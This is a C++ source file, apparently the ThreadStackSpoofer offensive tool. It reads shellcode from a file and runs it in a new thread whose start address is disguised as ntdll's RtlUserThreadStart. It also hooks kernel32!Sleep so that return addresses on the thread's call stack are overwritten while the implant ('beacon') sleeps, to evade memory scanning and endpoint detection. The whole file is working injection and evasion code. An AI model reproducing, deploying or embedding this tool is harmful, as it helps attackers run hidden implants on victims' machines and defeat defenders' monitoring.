
#include "header.h"

HookedSleep g_hookedSleep;
StackTraceSpoofingMetadata g_stackTraceSpoofing;


void WINAPI MySleep(DWORD _dwMilliseconds)
{
    const volatile DWORD dwMilliseconds = _dwMilliseconds;
    spoofCallStack(true);

    log("MySleep(", std::dec, dwMilliseconds, ")");
    ::SleepEx(dwMilliseconds, false);
 
    spoofCallStack(false);
}

bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers /*= NULL*/)
{
#ifdef _WIN64
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    uint64_t addr = (uint64_t)(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));
#else
    uint8_t trampoline[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
        0xFF, 0xE0                        // jmp eax
    };

    uint32_t addr = (uint32_t)(jumpAddress);
    memcpy(&trampoline[1], &addr, sizeof(addr));
#endif

    DWORD dwSize = sizeof(trampoline);
    DWORD oldProt = 0;
    bool output = false;

    if (installHook)
    {
        if (buffers != NULL)
        {
            if (buffers->previousBytes == nullptr || buffers->previousBytesSize == 0)
                return false;

            memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
        }

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, trampoline, dwSize);
            output = true;
        }
    }
    else
    {
        if (buffers == NULL)
            return false;

        if (buffers->originalBytes == nullptr || buffers->originalBytesSize == 0)
            return false;

        dwSize = buffers->originalBytesSize;

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, buffers->originalBytes, dwSize);
            output = true;
        }
    }

    ::VirtualProtect(
        addressToHook,
        dwSize,
        oldProt,
        &oldProt
    );

    return output;
}

bool hookSleep()
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.previousBytes = g_hookedSleep.sleepStub;
    buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);

    g_hookedSleep.origSleep = reinterpret_cast<typeSleep>(Sleep);

    if (!fastTrampoline(true, (BYTE*)::Sleep, &MySleep, &buffers))
        return false;

    return true;
}

void walkCallStack(HANDLE hThread, CallStackFrame* frames, size_t maxFrames, size_t* numOfFrames, bool onlyBeaconFrames /*= false*/)
{
    CONTEXT c = { 0 };
    STACKFRAME64 s = { 0 };
    DWORD imageType;
    ULONG curRecursionCount = 0;

    c.ContextFlags = CONTEXT_ALL;

    if (hThread == GetCurrentThread() || hThread == 0)
        RtlCaptureContext(&c);
    else
        GetThreadContext(hThread, &c);

#ifdef _M_IX86
    const ULONG_PTR invalidAddr = 0xcccccccc;
    // normally, call ImageNtHeader() and use machine info from PE header
    imageType = IMAGE_FILE_MACHINE_I386;
    s.AddrPC.Offset = c.Eip;
    s.AddrPC.Mode = AddrModeFlat;
    s.AddrFrame.Offset = c.Ebp;
    s.AddrFrame.Mode = AddrModeFlat;
    s.AddrStack.Offset = c.Esp;
    s.AddrStack.Mode = AddrModeFlat;
#elif _M_X64
    const ULONG_PTR invalidAddr = 0xcccccccccccccccc;
    imageType = IMAGE_FILE_MACHINE_AMD64;
    s.AddrPC.Offset = c.Rip;
    s.AddrPC.Mode = AddrModeFlat;
    s.AddrFrame.Offset = c.Rsp;
    s.AddrFrame.Mode = AddrModeFlat;
    s.AddrStack.Offset = c.Rsp;
    s.AddrStack.Mode = AddrModeFlat;
#elif _M_IA64
    const ULONG_PTR invalidAddr = 0xcccccccccccccccc;
    imageType = IMAGE_FILE_MACHINE_IA64;
    s.AddrPC.Offset = c.StIIP;
    s.AddrPC.Mode = AddrModeFlat;
    s.AddrFrame.Offset = c.IntSp;
    s.AddrFrame.Mode = AddrModeFlat;
    s.AddrBStore.Offset = c.RsBSP;
    s.AddrBStore.Mode = AddrModeFlat;
    s.AddrStack.Offset = c.IntSp;
    s.AddrStack.Mode = AddrModeFlat;
#else
#error "Platform not supported!"
#endif

    log("WalkCallStack: Stack Trace: ");

    *numOfFrames = 0;
    ULONG Frame = 0;

    for (Frame = 0; ; Frame++)
    {
        BOOL result = g_stackTraceSpoofing.pStackWalk64(
            imageType,
            GetCurrentProcess(),
            hThread,
            &s,
            &c,
            NULL,
            (PFUNCTION_TABLE_ACCESS_ROUTINE64)g_stackTraceSpoofing.pSymFunctionTableAccess64,
            (PGET_MODULE_BASE_ROUTINE64)g_stackTraceSpoofing.pSymGetModuleBase64,
            NULL
        );

        if (!result || s.AddrReturn.Offset == 0)
            break;

        if (s.AddrPC.Offset == s.AddrReturn.Offset)
        {
            if (curRecursionCount > 1000)
            {
                break;
            }
            curRecursionCount++;
        }
        else
        {
            curRecursionCount = 0;
        }

        CallStackFrame frame = { 0 };

        frame.calledFrom = s.AddrPC.Offset;
        frame.stackAddr = s.AddrStack.Offset;
        frame.frameAddr = s.AddrFrame.Offset;
        frame.retAddr = s.AddrReturn.Offset;

        if (Frame > maxFrames)
            break;

        if (Frame < Frames_To_Preserve) continue;

        bool skipFrame = false;

        if (onlyBeaconFrames)
        {
            MEMORY_BASIC_INFORMATION mbi = { 0 };

            if (VirtualQuery((LPVOID)frame.retAddr, &mbi, sizeof(mbi)))
            {
                if (mbi.Type != MEM_PRIVATE && mbi.Type != 0) skipFrame = true;

                if ((mbi.Protect & PAGE_EXECUTE) != 0 || (mbi.Protect & PAGE_EXECUTE_READ) != 0 || !(mbi.Protect & PAGE_EXECUTE_READWRITE) != 0) {
                }
                else {
                    skipFrame = true;
                }
            }

            if (frame.retAddr == invalidAddr) skipFrame = true;
        }

        if (!skipFrame && frame.retAddr != 0 && frame.frameAddr != 0)
        {
            frames[(*numOfFrames)++] = frame;
        }

        log("\t", std::dec, Frame, ".\tcalledFrom: 0x", std::setw(8), std::hex, frame.calledFrom, " - stack: 0x", frame.stackAddr, 
            " - frame: 0x", frame.frameAddr, " - ret: 0x", frame.retAddr, " - skip? ", skipFrame);
    }

    log("WalkCallStack: Stack Trace finished.");
}

void spoofCallStack(bool overwriteOrRestore)
{
    CallStackFrame frames[MaxStackFramesToSpoof] = { 0 };
    size_t numOfFrames = 0;

    walkCallStack(GetCurrentThread(), frames, _countof(frames), &numOfFrames, true);

    if (overwriteOrRestore)
    {
        for (size_t i = 0; i < numOfFrames; i++)
        {
            auto& frame = frames[i];

            if (g_stackTraceSpoofing.spoofedFrames < MaxStackFramesToSpoof)
            {
                frame.overwriteWhat = (ULONG_PTR)::CreateFileW;
                g_stackTraceSpoofing.spoofedFrame[g_stackTraceSpoofing.spoofedFrames++] = frame;
            }
        }

        for (size_t i = 0; i < g_stackTraceSpoofing.spoofedFrames; i++)
        {
            auto frame = g_stackTraceSpoofing.spoofedFrame[i];
            *(PULONG_PTR)(frame.frameAddr + sizeof(ULONG_PTR)) = frame.overwriteWhat;

            log("\t\t\tSpoofed: 0x", 
                std::setw(8), std::setfill('0'), std::hex, frame.retAddr, " -> 0x", frame.overwriteWhat);
        }
    }
    else
    {
        for (size_t i = 0; i < g_stackTraceSpoofing.spoofedFrames; i++)
        {
            auto frame = g_stackTraceSpoofing.spoofedFrame[i];

            *(PULONG_PTR)(frame.frameAddr + sizeof(ULONG_PTR)) = frame.retAddr;

            log("\t\t\tRestored: 0x", std::setw(8), std::setfill('0'), std::hex, frame.overwriteWhat, " -> 0x", frame.retAddr);
        }

        memset(g_stackTraceSpoofing.spoofedFrame, 0, sizeof(g_stackTraceSpoofing.spoofedFrame));
        g_stackTraceSpoofing.spoofedFrames = 0;
    }

    return;
}

bool initStackSpoofing()
{
    memset(&g_stackTraceSpoofing, 0, sizeof(g_stackTraceSpoofing));

    g_stackTraceSpoofing.hDbghelp = LoadLibraryA("dbghelp.dll");
    if (!g_stackTraceSpoofing.hDbghelp)
        return false;

    g_stackTraceSpoofing.pSymFunctionTableAccess64 =
        GetProcAddress(g_stackTraceSpoofing.hDbghelp, "SymFunctionTableAccess64");
    g_stackTraceSpoofing.pSymGetModuleBase64 =
        GetProcAddress(g_stackTraceSpoofing.hDbghelp, "SymGetModuleBase64");
    g_stackTraceSpoofing.pStackWalk64 =
        (typeStackWalk64)GetProcAddress(g_stackTraceSpoofing.hDbghelp, "StackWalk64");
    auto pSymInitialize =
        (typeSymInitialize)GetProcAddress(g_stackTraceSpoofing.hDbghelp, "SymInitialize");

    if (!g_stackTraceSpoofing.pSymFunctionTableAccess64
        || !g_stackTraceSpoofing.pSymGetModuleBase64
        || !g_stackTraceSpoofing.pStackWalk64
        || !pSymInitialize
        )
        return false;

    pSymInitialize(GetCurrentProcess(), nullptr, TRUE);

    log("[+] Stack spoofing initialized.");
    g_stackTraceSpoofing.initialized = true;
    return true;
}

bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
{
    HandlePtr file(CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    ), &::CloseHandle);

    if (INVALID_HANDLE_VALUE == file.get())
        return false;

    DWORD highSize;
    DWORD readBytes = 0;
    DWORD lowSize = GetFileSize(file.get(), &highSize);

    shellcode.resize(lowSize, 0);

    return ReadFile(file.get(), shellcode.data(), lowSize, &readBytes, NULL);
}

bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
{
    auto alloc = ::VirtualAlloc(
        NULL,
        shellcode.size() + 1,
        MEM_COMMIT,
        PAGE_READWRITE
    );

    if (!alloc) 
        return false;

    memcpy(alloc, shellcode.data(), shellcode.size());

    DWORD old;
    
    if (!VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old))
        return false;

    LPVOID fakeAddr = (LPVOID)(((ULONG_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "RtlUserThreadStart")) + 0x21);
    
    BYTE origRtlUserThreadStartBytes[16];
    HookTrampolineBuffers buffers = { 0 };
    buffers.previousBytes = buffers.originalBytes = origRtlUserThreadStartBytes;
    buffers.previousBytesSize = buffers.originalBytesSize = sizeof(origRtlUserThreadStartBytes);
    if (!fastTrampoline(true, (BYTE*)fakeAddr, alloc, &buffers))
        return false;
    
    shellcode.clear();
    thread.reset(::CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)fakeAddr,
        0,
        0,
        0
    ));

    ::SleepEx(1000, false);

    if (!fastTrampoline(false, (BYTE*)fakeAddr, alloc, &buffers))
        return false;

    return (NULL != thread.get());
}

int main(int argc, char** argv)
{
    if (argc < 3)
    {
        log("Usage: ThreadStackSpoofer.exe <shellcode> <spoof>");
        return 1;
    }

    std::vector<uint8_t> shellcode;
    bool spoof = (!strcmp(argv[2], "true") || !strcmp(argv[2], "1"));

    log("[.] Reading shellcode bytes...");
    if (!readShellcode(argv[1], shellcode))
    {
        log("[!] Could not open shellcode file! Error: ", ::GetLastError());
        return 1;
    }

    if (spoof)
    {
        log("[.] Thread call stack will be spoofed.");
        if (!initStackSpoofing())
        {
            log("[!] Could not initialize stack spoofing!");
            return 1;
        }

        log("[.] Hooking kernel32!Sleep...");
        if (!hookSleep())
        {
            log("[!] Could not hook kernel32!Sleep!");
            return 1;
        }
    }
    else
    {
        log("[.] Thread call stack will NOT be spoofed.");
    }

    log("[.] Injecting shellcode...");

    HandlePtr thread(NULL, &::CloseHandle);
    if (!injectShellcode(shellcode, thread))
    {
        log("[!] Could not inject shellcode! Error: ", ::GetLastError());
        return 1;
    }

    log("[+] Shellcode is now running.");

    WaitForSingleObject(thread.get(), INFINITE);
}